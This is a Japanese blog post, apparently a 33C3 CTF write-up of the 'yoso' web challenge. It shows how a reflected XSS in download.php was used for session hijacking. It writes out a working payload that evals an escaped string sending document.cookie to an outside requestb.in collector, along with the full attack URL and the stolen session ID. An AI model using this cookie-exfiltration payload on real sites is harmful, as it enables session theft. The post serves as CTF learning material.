---
layout: post
redirect_from:
  - /blog/2016/12/30/33c3-ctf-yoso/
date: "2016-12-30T13:39:40+09:00"
tags: [ "ctf", "writeup", "web", "33c3-ctf", "javascript", "xss", "session-hijack", "csrf", "csrf-token" ]
---

# 33C3 CTF: yoso

深夜まで必死で粘ってなんとか倒した。達成感があった。

## problem

一括検索 + 検索履歴保存のサービス。そしてadminはflagについて検索するのが好きとのこと。

![](/blog/2016/12/30/33c3-ctf-yoso/1.png)
![](/blog/2016/12/30/33c3-ctf-yoso/2.png)

## solution

-   `/register.php`/`/login.php/`logout.php`: 何もなさそう
-   `/search.php`: 検索ができる
-   `/bookmark.php`: POSTすればzipが鯖上に生成される
-   `/download.php`: そのzipを削除しつつ取得
-   `/feedback.php`: linkを送ると鯖上で踏んでjsを実行してくれる

`/feedback.php`から`/bookmark.php`にPOSTして出きたzipを奪うのが思い付くが、`/bookmark.php`はCSRF tokenを持つのでだめ。
しかし`/download.php`にはXSSの脆弱性を持つので、これを踏ませてsession hijackにする。

最終的な攻撃linkはこれ: <http://78.46.224.80:1337/download.php?zip=%3Cscript%3Eeval%28%22location%5Cx2ehref%3D%5C%22http%3A%2F%2Frequestb%5Cx2ein%2F18o1k6g1%3F%5C%22%2Bdocument%5Cx2ecookie%3B%22%29%3C%2Fscript%3E>。

実行させたいjavascriptは以下。

``` javascript
location.href = "http://requestb.in/18o1k6g1?" + document.cookie;
```

しかし`/download.zip`では`..`を防ぐのと兼ねて`.`が消去される。なので文字列に持ちあげて`eval`する。
XSSは<http://78.46.224.80:1337/download.php?zip=%3Cmarquee%3EXSS%3C/marquee%3E>みたいに仕込める。

``` html
eval("location\x2ehref=\"http://requestb\x2ein/18o1k6g1?\"+document\x2ecookie;")
http://78.46.224.80:1337/download.php?zip=<script>eval("location\x2ehref=\"http://requestb\x2ein/18o1k6g1?\"+document\x2ecookie;")</script>
```


得られたのは`PHPSESSID=c5u3mgfndm4u241ji3ad9bajn1`。
結局CSRF tokenは破れず。

flag: `33C3_lol_wHo_needs_scr1pts_anyway`
